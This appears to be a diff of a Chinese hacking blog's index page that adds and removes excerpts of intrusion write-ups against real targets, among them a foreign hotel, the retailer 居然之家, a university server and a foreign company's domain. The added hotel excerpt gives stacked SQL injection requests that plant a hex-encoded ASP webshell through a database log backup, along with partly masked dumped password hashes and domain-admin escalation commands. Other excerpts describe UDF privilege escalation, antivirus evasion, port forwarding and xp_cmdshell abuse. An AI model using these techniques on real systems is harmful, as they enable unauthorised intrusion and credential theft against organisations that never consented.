@@ -107,6 +107,70 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
+      <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">
+          2012-12-09
+      </time>
+    
+    
+    | 
+    <a href='/tag/Webshell/'>Webshell</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/952.seo/">对国外某hotel的内网域渗透案例</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br />首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370" /></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br /><a href="http://www.pentesting.cc/test.aspx?id=1">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br />Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</p>            <p>test.aspx?id=1;declare/</strong>/@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>            <p>test.aspx?id=1;insert/</strong>/into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125" /></a>    <br />如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br />在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*</strong>ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </p>            <p>br</em></strong>ez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </p>            <p>hm</em></strong>o:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br />dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/952.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-09-25T05:56:48.000Z" itemprop="datePublished">
+          2012-09-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/提权/'>提权</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>,
+    
+    <a href='/tag/嗅探/'>嗅探</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/852.seo/">对居然之家的一次内网渗透</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>先上图：</p>  <p><a href="http://img.cker.in/89c468c9f1cf_10E52/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/89c468c9f1cf_10E52/clip_image001_thumb.jpg" width="508" height="287" /></a></p>  <p>本来是不想搞站的，专心学点编程，可是老是有人来找我帮忙什么的。。。搞完这个我想专心学点编程，俗话说不会编程的黑客不算是高富帅。。。所以说，你懂得。</p>  <p>进入正题</p>  <p>1. 主站摸索</p>  <p>2. 旁站摸索</p>  <p>3. 旁服摸索</p>  <p>4.</p>  <p>不开玩笑了。。</p>  <p>嫖叔尝试过主站服务器了，但是没有搞下来，我这人比较懒，当时也没有追随着嫖叔的脚步搞那个db权限的注射点，一来好久没搞注入了，二来对注入也无爱了。后来玩命有一天很激动的告诉我说拿到了旁服上的一个shell，叫我提权试试，我想了想，既然这是个企业站，注册资金据说有8100w，肯定很有钱，服务器肯定也是大大的有，放在内网的话还能内网渗透一下，于是就上了。</p>  <p>顺便说下，玩命搞到的那个shell是通过注射加后台上传拿到的，大家就别再搞了。</p>  <p>上了shell看了下，权限很大，几乎全盘浏览了，支持asp，aspx，php，翻了下看见了xampp，管理员还真懒，mysql估计就是系统权限运行的，而且我猜root密码还是默认为空。于是翻查数据库连接文件，管理员果然没让我失望</p>  <p><a href="http://img.cker.in/89c468c9f1cf_10E52/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/89c468c9f1cf_10E52/clip_image002_thumb.jpg" width="508" height="305" /></a></p>  <p>于是果断mysql导出udf提权，加了个系统权限的用户，上了rootki.asp（这玩意用系统帐号登录，权限为system，比较方便）</p>  <p>查了下远程桌面端口发现没改，ipconfig发现是双网卡，但都在内网，装了金山杀毒软件和金山管理软件（不记得是不是这个名字了）</p>  <p>上传lcx想转发端口的，可惜被杀了，试了下taskkill，ntsd都不能把杀毒的进程给杀完，最主要的杀毒进程杀不掉，没办法，找小陈做了个免杀，自己又是外网（怨念哪。。当初花150买了个90块钱的tplink路由器，结果发现不能把自己放到dmz去，端口映射也不行，被黑出翔了，如果我是外网的，可以做更多的事的，反弹到我这里，用metasploit进行内网渗透。。。嘿嘿，留口水了）于是上外网服务器操作了，那慢的叫我想死了。。。不过好歹有个桌面环境给我操作，不用一直命令行了。</p>  <p>既然是内网，当然是要内网搞一搞了，但是之前我在服务器上翻了下，发现了装有winwebmail，这玩意一开始查同服的时候就知道了，只不过貌似限制了ip登录，但是我控制了服务端，不怕限制ip登录，以后可以作为一个信息来源，先留着。</p>  <p>Cmd下执行各种命令对内网环境做一个基本的了解。</p>  <p>C:Documents and Settingsfucker&gt;net view /domain 查看有几个组</p>  <p>Domain————————————————————-</p>  <p>MYGROUP</p>  <p>WORKGROUP</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker桌面Pwdump7&gt;netview（查询有关系的机器）</p>  <p>服务器名称 注释</p>  <p>————————————————————————</p>  <p>EFGP</p>  <p>IBM</p>  <p>IIBM</p>  <p>JR141&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; jr141</p>  <p>JR142</p>  <p>JURANZHIJIALEWU</p>  <p>JURZJCTI-9897F9</p>  <p>LEWU</p>  <p>OASERVER</p>  <p>POS27&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos27</p>  <p>POS28</p>  <p>POS29&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos29</p>  <p>POS30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos30</p>  <p>USER-87C8B53A9C</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker&gt;net view/domain:workgroup（查看workgroup组下的机器）</p>  <p>服务器名称 注释</p>  <p>——————————————————————</p>  <p>EFGP</p>  <p>IBM</p>  <p>JR141&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; jr141</p>  <p>JR142</p>  <p>JURANZHIJIALEWU</p>  <p>JURZJCTI-9897F9</p>  <p>LEWU</p>  <p>OASERVER</p>  <p>POS27&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos27</p>  <p>POS28</p>  <p>POS29&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos29</p>  <p>POS30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos30</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker&gt;net view/domain:mygroup（查询mygroup组下的机器）</p>  <p>服务器名称 注释</p>  <p>————————————————————————-</p>  <p>AP-3850-3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Samba Server Version 3.0.33-0.17.el4</p>  <p>GP53&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Samba Server Version 3.0.33-3.28.el5</p>  <p>命令成功完成。-</p>  <p>其实这些东西查询出来</p>
+      
+      </p>
+      
+      <p>
+          <a href="/852.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
       <time datetime="2012-06-21T12:12:12.000Z" itemprop="datePublished">
           2012-06-21
       </time>
@@ -159,67 +223,6 @@
       
       <p>
           <a href="/499.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T10:03:10.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/495.seo/">渗透某高校内网服务器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>前言：今天没事搜索资料的时候来到了这个网站，出于个人信息安全爱好就对他做一番检测!   <br /> 今天我们渗透的对象是www.TEST.com IP: 218.6.x.193在IP138上查询信息如下：    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/74ae0491df9c_1CBF/clip_image002.jpg" width="355" height="224" />    <br /> 经过我的简单踩点，发现新闻中心 教学研究 招生就业等主要内容都无法打开，提示数据库连接出错。具体是什么原因我也不清楚，可能是管理的错误操作，也可以是黑客大牛进去做的破坏。仅只有一个板块可以打开<a href="http://218.6.X.193:800/scr2006/">http://218.6.X.193:800/scr2006/</a> ，留给我们发挥的余地很小!分析连接WEB端口是800，很有可能是内网映射出来的。暂只做个估计。我们先检测下这个天空网络教室看有可以利用的没，在我的记忆中是有脚本上传漏洞的漏洞文件是 HTMLEDITOR/GETFILE.ASP 这个文件参数过滤不严格，我们可以上传ASA CER HTR等脚本木马。我们提交路径显示“对不起，访问被拒绝”管理可能修补了，我们再提交HTMLEDITOR/GETFILE1.ASP很多管理在打补丁的时候喜欢备份一个文件，害怕有时候出错。我们提交看下 无法找到。找到默认的管理后台尝试社工管理员密码。失败。现在SQL注射也是很火的。Root/ShowImage.asp 天空的这个文件好像也爆过啦注射漏洞，我们提交个 ’号提示“请不好提交非法字符”，郁闷加了防注射代码。尝试使用COOKIES注射失败。看来漏洞修改得很好。习惯性的在那个文件名字后面加个1也就是Root/ShowImage1.asp，发现文件存在，看来是管理修补的时候，备份的忘记删除了。哈哈。这也是我的个人的小技巧。我们知道天空很多程序很多都是使用MSSQL数据库的.然后我们带上参数提交，继续加个’号。马上出现经典的错误，提交AND USER&gt;0 判断连接数据库用户.    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/74ae0491df9c_1CBF/clip_image004.jpg" width="405" height="253" />    <br /> 权限不小啊!继续提交;exec master.dbo.xp_cmdshell ‘net user’–，提示我们下载文件。看来是执行成功了。XP_CMDSHELL是没有删除的。手工搞着累，马上拿出大牛ZWELL写的注射器注射，这个<a href="http://soft.77169.com/">软件</a>很好用，特别是命令执行的功能，很强大。输入VER查看系统版本，显示Microsoft Windows [版本 5.2.3790] 2003的服务器，通过读注册表的键值 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] 端口是3389 NETSTAT -AN查看ZH终端也是开放了的，不过他是内网。不能直接连接，用啊D写了一个有下载功能的VBS脚本在C盘。尝试下载我们的LCX端口转发工具。注射器执行的效果不是很理想，半天没反应。这条路不太好走，尝试使用注射工具的上环功能上传也很慢，卡死了几次。于是我们转换思路。那我们就拿一个WEBSHELL再说吧!用啊D列目录，最终目标锁定在D:\Easiware\SkyClass2006\Asp\Root这个目录，SA权限无所不能，用啊D写了一个一句话木马的服务端在该目录下，用客户端连接成功得到一个WBESHELL。后门用的我哥职业色狼的.如图2    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/74ae0491df9c_1CBF/clip_image006.jpg" width="406" height="315" />    <br /> 简单查看服务器信息，装有SU6.4 MSSQL 瑞星杀毒软件 360安全卫士 FSO WS组件可以使用，C-F盘全部可以浏览访问。渗透中发现，使用注射器执行命令效果很不理想。于是我就翻阅数据库的连接文件找连接MSSQL数据库的账号密码。通过仔细查找D:\Easiware\SkyClass2006\Asp\Global.asa这个文件是连接文件。结果发现用户不是SA。如图：    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/74ae0491df9c_1CBF/clip_image008.jpg" width="418" height="224" />    <br /> 虽然不是SA，但是他一样是管理的权限。一样可以EXEC COMMAN!打开查询分析器输入数据库相关连接信息，提示无法连接。马上在命令提示符中：TELNET 218.6.X.193 1433 提示无法打开，看来1433并没有映射到外网。那我们就在WEBSHELL上本地连接吧!马上上传一个asp版sql在线管理后门,这个后门很好用。我简单的说下用法吧，先输入密码登陆，再点击重新设置数据源。在这里我们输入数据库的名称和账号密码，数据库服务器就保持(local)不变，因为我们就是本地连接他的。输入完后我们点击提交，如果数据库名密码账号等信息正确就会出现设置成功的字样。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/74ae0491df9c_1CBF/clip_image010.jpg" width="404" height="266" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/495.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T09:46:14.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
-    
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/483.seo/">win内网渗透实例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者：赤龙<br>最近在整理资料时发现一些渗透笔记，于是翻开看看，原来有一个老外的内部网还没有拿下。当时已经给内网的一台机器种植了木马，反正闲着没事就拿它来练练手吧。打开远程居然肉鸡还在，废话就不多说了，下面开始吧。<br>首先来看看已经控制的这台电脑在内网中充当什么角色，并收集一些常规的信息。执行ipconfig /all (如图1)</p>
-<p><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/win_18C1/clip_image001.png" alt="clip_image001" width="752" height="754" border="0" /><br>从这里我们可以看出，此计算机名为abimaq6，ip地址是172.16.16.139。子网掩码为255.255.240.0、网关172.16.16.1、DNS服务器分别是172.16.16.2和172.16.16.3。还有一个重要的就是这台机器处于域管理模式中，所在域为abimaq.local。<br>既然是域结构，再来获取一下域用户列表，执行net user /domain命令(如图2)。该命令可显示所有的域用户名单。看来域用户还真多。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/483.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
